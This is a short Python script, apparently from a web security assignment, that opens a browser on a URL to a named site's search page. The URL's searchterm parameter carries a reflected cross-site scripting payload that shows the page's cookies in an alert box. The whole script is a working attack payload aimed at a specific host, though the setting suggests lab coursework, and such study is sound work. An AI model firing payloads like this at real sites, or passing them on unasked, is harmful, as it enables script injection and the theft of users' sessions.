#change the url to execute reflected xss attack
import webbrowser
url = "https://www.wsb.com/Assignment2/case12.php?searchterm=<script>alert(document.cookie)</script>"
new = 2 #open in new window
webbrowser.open(url,new=new)
